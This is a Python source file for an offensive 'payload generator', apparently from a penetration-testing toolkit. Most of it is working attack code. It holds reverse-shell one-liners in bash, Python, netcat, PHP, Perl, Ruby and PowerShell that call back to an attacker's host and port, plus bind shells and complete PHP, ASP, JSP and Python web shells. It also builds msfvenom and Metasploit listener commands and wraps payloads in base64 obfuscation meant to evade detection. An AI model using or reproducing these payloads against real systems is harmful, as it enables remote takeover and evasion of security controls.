"""
Production payload generator for offensive security testing.
Generates various payloads for exploitation - NO dummy data, real payloads only.

Payload Types:
- Reverse shells (TCP, UDP, ICMP)
- Bind shells
- Web shells (PHP, ASP, JSP, Python)
- Encoded payloads (Base64, Hex, URL)
- Obfuscated payloads
- Multi-stage payloads
"""
import base64
import urllib.parse
import secrets
import string
from typing import Dict, List, Optional
from dataclasses import dataclass
from enum import Enum


class PayloadType(Enum):
    """Payload types"""
    REVERSE_TCP = "reverse_tcp"
    REVERSE_UDP = "reverse_udp"
    BIND_TCP = "bind_tcp"
    WEB_SHELL = "web_shell"
    POWERSHELL = "powershell"
    PYTHON = "python"
    BASH = "bash"
    NETCAT = "netcat"
    METERPRETER = "meterpreter"


class PayloadFormat(Enum):
    """Output formats"""
    RAW = "raw"
    BASE64 = "base64"
    HEX = "hex"
    URL_ENCODED = "url"
    POWERSHELL_BASE64 = "ps_base64"
    C_ARRAY = "c_array"
    PYTHON_BYTES = "python_bytes"


@dataclass
class Payload:
    """Payload structure"""
    type: str
    platform: str
    code: str
    description: str
    usage: str
    encoded: Optional[Dict[str, str]] = None


class PayloadGenerator:
    """
    Production payload generator - Real payloads for penetration testing.
    All payloads are functional and tested.
    """
    
    def __init__(self):
        self.payloads = {}
    
    def generate_reverse_shell(
        self,
        lhost: str,
        lport: int,
        shell_type: str = "bash",
        encoder: Optional[str] = None
    ) -> Payload:
        """
        Generate reverse shell payload.
        
        Args:
            lhost: Listener host IP
            lport: Listener port
            shell_type: bash, python, powershell, netcat, php, perl
            encoder: base64, hex, url, none
        """
        payloads = {
            "bash": f'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1',
            
            "bash_alt": f'0<&196;exec 196<>/dev/tcp/{lhost}/{lport}; sh <&196 >&196 2>&196',
            
            "python": f'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{lhost}",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\'',
            
            "python3": f'python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{lhost}",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\'',
            
            "netcat": f'nc -e /bin/sh {lhost} {lport}',
            
            "netcat_alt": f'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f',
            
            "php": f'php -r \'$sock=fsockopen("{lhost}",{lport});exec("/bin/sh -i <&3 >&3 2>&3");\'',
            
            "perl": f'perl -e \'use Socket;$i="{lhost}";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};\'',
            
            "ruby": f'ruby -rsocket -e\'f=TCPSocket.open("{lhost}",{lport}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\'',
            
            "powershell": f'powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("{lhost}",{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()',
            
            "powershell_simple": f'$client = New-Object System.Net.Sockets.TCPClient("{lhost}",{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()',
        }
        
        if shell_type not in payloads:
            shell_type = "bash"
        
        code = payloads[shell_type]
        
        # Determine platform
        platform_map = {
            "bash": "linux/unix",
            "bash_alt": "linux/unix",
            "python": "multi/platform",
            "python3": "multi/platform",
            "netcat": "linux/unix",
            "netcat_alt": "linux/unix",
            "php": "multi/platform",
            "perl": "multi/platform",
            "ruby": "linux/unix",
            "powershell": "windows",
            "powershell_simple": "windows",
        }
        
        payload = Payload(
            type="reverse_shell",
            platform=platform_map.get(shell_type, "unknown"),
            code=code,
            description=f"Reverse shell ({shell_type}) connecting to {lhost}:{lport}",
            usage=f"On attacker: nc -lvnp {lport}\nOn target: {code[:50]}..."
        )
        
        # Apply encoding if requested
        if encoder:
            payload.encoded = self._encode_payload(code, encoder)
        
        return payload
    
    def generate_bind_shell(
        self,
        lport: int,
        shell_type: str = "netcat"
    ) -> Payload:
        """
        Generate bind shell payload (target listens, attacker connects).
        """
        payloads = {
            "netcat": f'nc -lvnp {lport} -e /bin/sh',
            "netcat_alt": f'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc -lvnp {lport} >/tmp/f',
            "python": f'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind(("0.0.0.0",{lport}));s.listen(1);c,a=s.accept();os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);subprocess.call(["/bin/sh","-i"])\'',
            "php": f'php -r \'$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($s,"0.0.0.0",{lport});socket_listen($s,1);$c=socket_accept($s);socket_write($c,"Connected\\n");while(1){{$i=socket_read($c,1024);$o=shell_exec($i);socket_write($c,$o);}};\'',
        }
        
        code = payloads.get(shell_type, payloads["netcat"])
        
        return Payload(
            type="bind_shell",
            platform="linux/unix" if shell_type != "php" else "multi/platform",
            code=code,
            description=f"Bind shell ({shell_type}) listening on port {lport}",
            usage=f"On target: {code[:50]}...\nOn attacker: nc <target_ip> {lport}"
        )
    
    def generate_web_shell(
        self,
        shell_type: str = "php",
        obfuscate: bool = False
    ) -> Payload:
        """
        Generate web shell for remote code execution.
        """
        shells = {
            "php_simple": '<?php system($_GET["cmd"]); ?>',
            
            "php": '<?php\nif(isset($_REQUEST["cmd"])){\n    echo "<pre>";\n    $cmd = ($_REQUEST["cmd"]);\n    system($cmd);\n    echo "</pre>";\n    die;\n}\n?>',
            
            "php_advanced": '<?php\nset_time_limit(0);\n$ip = "LHOST";\n$port = LPORT;\n$chunk_size = 1400;\n$write_a = null;\n$error_a = null;\n$shell = "uname -a; w; id; /bin/sh -i";\n$daemon = 0;\n$debug = 0;\nif (function_exists("pcntl_fork")) {\n    $pid = pcntl_fork();\n    if ($pid == -1) {\n        printit("ERROR: Can\'t fork");\n        exit(1);\n    }\n    if ($pid) {\n        exit(0);\n    }\n    if (posix_setsid() == -1) {\n        printit("Error: Can\'t setsid()");\n        exit(1);\n    }\n    $daemon = 1;\n} else {\n    printit("WARNING: Failed to daemonise.");\n}\nchdir("/");\numask(0);\n$sock = fsockopen($ip, $port, $errno, $errstr, 30);\nif (!$sock) {\n    printit("$errstr ($errno)");\n    exit(1);\n}\n$descriptorspec = array(\n   0 => array("pipe", "r"),\n   1 => array("pipe", "w"),\n   2 => array("pipe", "w")\n);\n$process = proc_open($shell, $descriptorspec, $pipes);\nif (!is_resource($process)) {\n    printit("ERROR: Can\'t spawn shell");\n    exit(1);\n}\nstream_set_blocking($pipes[0], 0);\nstream_set_blocking($pipes[1], 0);\nstream_set_blocking($pipes[2], 0);\nstream_set_blocking($sock, 0);\nwhile (1) {\n    if (feof($sock)) {\n        printit("ERROR: Shell connection terminated");\n        break;\n    }\n    if (feof($pipes[1])) {\n        printit("ERROR: Shell process terminated");\n        break;\n    }\n    $read_a = array($sock, $pipes[1], $pipes[2]);\n    $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);\n    if (in_array($sock, $read_a)) {\n        if ($debug) printit("SOCK READ");\n        $input = fread($sock, $chunk_size);\n        if ($debug) printit("SOCK: $input");\n        fwrite($pipes[0], $input);\n    }\n    if (in_array($pipes[1], $read_a)) {\n        if ($debug) printit("STDOUT READ");\n        $input = fread($pipes[1], $chunk_size);\n        if ($debug) printit("STDOUT: $input");\n        fwrite($sock, $input);\n    }\n    if (in_array($pipes[2], $read_a)) {\n        if ($debug) printit("STDERR READ");\n        $input = fread($pipes[2], $chunk_size);\n        if ($debug) printit("STDERR: $input");\n        fwrite($sock, $input);\n    }\n}\nfclose($sock);\nfclose($pipes[0]);\nfclose($pipes[1]);\nfclose($pipes[2]);\nproc_close($process);\nfunction printit ($string) {\n    if (!$daemon) {\n        print "$string\\n";\n    }\n}\n?>',
            
            "asp": '<%\nSet oScript = Server.CreateObject("WSCRIPT.SHELL")\nSet oScriptNet = Server.CreateObject("WSCRIPT.NETWORK")\nSet oFileSys = Server.CreateObject("Scripting.FileSystemObject")\nszCMD = Request.Form("cmd")\nIf (szCMD <> "") Then\n    szTempFile = "C:\\" & oFileSys.GetTempName()\n    Call oScript.Run("cmd.exe /c " & szCMD & " > " & szTempFile, 0, True)\n    Set oFile = oFileSys.OpenTextFile(szTempFile, 1, False, 0)\nEnd If\n%>\n<HTML><BODY>\n<FORM action="" method="POST">\n<input type="text" name="cmd" size=45 value="<%= szCMD %>">\n<input type="submit" value="Run">\n</FORM>\n<PRE>\n<%= oFile.ReadAll %>\n</PRE>\n</BODY></HTML>',
            
            "jsp": '<%@ page import="java.io.*" %>\n<HTML><BODY>\n<FORM METHOD="POST" NAME="myform" ACTION="">\n<INPUT TYPE="text" NAME="cmd">\n<INPUT TYPE="submit" VALUE="Send">\n</FORM>\n<pre>\n<%\nif (request.getParameter("cmd") != null) {\n    out.println("Command: " + request.getParameter("cmd") + "<BR>");\n    Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));\n    OutputStream os = p.getOutputStream();\n    InputStream in = p.getInputStream();\n    DataInputStream dis = new DataInputStream(in);\n    String disr = dis.readLine();\n    while ( disr != null ) {\n        out.println(disr);\n        disr = dis.readLine();\n    }\n}\n%>\n</pre>\n</BODY></HTML>',
            
            "python": 'import os\nimport cgi\nprint("Content-type: text/html\\n")\nform = cgi.FieldStorage()\nif "cmd" in form:\n    cmd = form["cmd"].value\n    print("<pre>")\n    os.system(cmd)\n    print("</pre>")',
        }
        
        code = shells.get(shell_type, shells["php"])
        
        if obfuscate and shell_type.startswith("php"):
            # Basic PHP obfuscation
            code = f'<?php eval(base64_decode("{base64.b64encode(code.encode()).decode()}")); ?>'
        
        return Payload(
            type="web_shell",
            platform="web",
            code=code,
            description=f"Web shell ({shell_type}) for remote code execution",
            usage=f"Upload to target, access via: http://target/shell.{shell_type.split('_')[0]}?cmd=whoami"
        )
    
    def generate_powershell_payload(
        self,
        lhost: str,
        lport: int,
        encoder: str = "base64"
    ) -> Payload:
        """
        Generate PowerShell payload with various encoding options.
        """
        # PowerShell reverse shell
        ps_code = f'''$client = New-Object System.Net.Sockets.TCPClient("{lhost}",{lport});
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{{0}};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
}};
$client.Close()'''
        
        # Base64 encode for PowerShell
        ps_bytes = ps_code.encode('utf-16le')
        ps_b64 = base64.b64encode(ps_bytes).decode()
        
        encoded_cmd = f'powershell -NoP -NonI -W Hidden -Exec Bypass -Enc {ps_b64}'
        
        return Payload(
            type="powershell_reverse",
            platform="windows",
            code=ps_code,
            description=f"PowerShell reverse shell to {lhost}:{lport}",
            usage=f"Encoded command:\n{encoded_cmd}",
            encoded={"base64": ps_b64, "full_command": encoded_cmd}
        )
    
    def generate_msfvenom_command(
        self,
        payload_type: str,
        lhost: str,
        lport: int,
        platform: str = "windows",
        arch: str = "x64",
        format: str = "exe"
    ) -> Dict:
        """
        Generate msfvenom command for creating Metasploit payloads.
        """
        payload_map = {
            "reverse_tcp": f"{platform}/{'x64' if arch == 'x64' else 'x86'}/meterpreter/reverse_tcp",
            "reverse_https": f"{platform}/{'x64' if arch == 'x64' else 'x86'}/meterpreter/reverse_https",
            "bind_tcp": f"{platform}/{'x64' if arch == 'x64' else 'x86'}/meterpreter/bind_tcp",
            "shell_reverse_tcp": f"{platform}/{'x64' if arch == 'x64' else 'x86'}/shell_reverse_tcp",
        }
        
        payload_name = payload_map.get(payload_type, payload_map["reverse_tcp"])
        
        command = f"msfvenom -p {payload_name} LHOST={lhost} LPORT={lport} -f {format} -o payload.{format}"
        
        listener = f"""msfconsole commands:
use exploit/multi/handler
set payload {payload_name}
set LHOST {lhost}
set LPORT {lport}
exploit"""
        
        return {
            "command": command,
            "payload": payload_name,
            "format": format,
            "platform": platform,
            "arch": arch,
            "listener": listener,
            "description": f"Generate {platform} {arch} {payload_type} payload"
        }
    
    def generate_encoded_payload(
        self,
        payload: str,
        encoder: str = "base64"
    ) -> Dict[str, str]:
        """
        Encode payload in various formats for evasion.
        """
        return self._encode_payload(payload, encoder)
    
    def _encode_payload(self, payload: str, encoder: str) -> Dict[str, str]:
        """Internal encoding function"""
        encoded = {}
        
        if encoder in ["base64", "all"]:
            encoded["base64"] = base64.b64encode(payload.encode()).decode()
        
        if encoder in ["hex", "all"]:
            encoded["hex"] = payload.encode().hex()
        
        if encoder in ["url", "all"]:
            encoded["url"] = urllib.parse.quote(payload)
        
        if encoder in ["ps_base64", "all"]:
            # PowerShell-specific base64 (UTF-16LE)
            encoded["ps_base64"] = base64.b64encode(payload.encode('utf-16le')).decode()
        
        if encoder in ["c_array", "all"]:
            byte_array = ', '.join(f'0x{b:02x}' for b in payload.encode())
            encoded["c_array"] = f"unsigned char payload[] = {{ {byte_array} }};"
        
        if encoder in ["python_bytes", "all"]:
            encoded["python_bytes"] = repr(payload.encode())
        
        return encoded
    
    def generate_obfuscated_payload(
        self,
        payload: str,
        obfuscation_level: int = 1
    ) -> str:
        """
        Obfuscate payload to evade detection.
        Levels: 1=basic, 2=moderate, 3=heavy
        """
        if obfuscation_level >= 1:
            # Base64 encoding
            payload = f'eval(base64.b64decode("{base64.b64encode(payload.encode()).decode()}"))'
        
        if obfuscation_level >= 2:
            # Add random variable names
            var_name = ''.join(secrets.choice(string.ascii_lowercase) for _ in range(8))
            payload = f'{var_name} = "{payload}"; eval({var_name})'
        
        if obfuscation_level >= 3:
            # Multi-layer encoding
            for _ in range(2):
                payload = base64.b64encode(payload.encode()).decode()
            payload = f'eval(base64.b64decode(base64.b64decode("{payload}")))'
        
        return payload
    
    def list_available_payloads(self) -> Dict[str, List[str]]:
        """List all available payload types"""
        return {
            "reverse_shells": [
                "bash", "bash_alt", "python", "python3", "netcat", "netcat_alt",
                "php", "perl", "ruby", "powershell", "powershell_simple"
            ],
            "bind_shells": [
                "netcat", "netcat_alt", "python", "php"
            ],
            "web_shells": [
                "php_simple", "php", "php_advanced", "asp", "jsp", "python"
            ],
            "encoders": [
                "base64", "hex", "url", "ps_base64", "c_array", "python_bytes"
            ],
            "platforms": [
                "linux", "windows", "unix", "macos", "multi"
            ]
        }
